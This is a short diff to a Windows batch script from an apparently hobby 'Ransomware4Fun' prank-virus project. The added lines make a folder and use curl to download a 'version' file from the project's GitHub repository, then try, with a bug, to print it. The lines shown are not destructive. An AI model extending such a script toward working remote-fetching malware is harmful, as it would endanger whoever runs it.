@@ -7,5 +7,9 @@ if %yn% == exit goto exit
 :start
 echo Uhh.. ok
 timeout -t 3 > NUL
-
+mkdir 0101287351256127
+cd 0101287351256127
+curl -o  version https://raw.githubusercontent.com/RivioxGaming/Ransomware4Fun/main/Batch/bruhvirusfiles/version > log.txt >> NUL
+set ver=type version
+echo version: %ver%
 pause
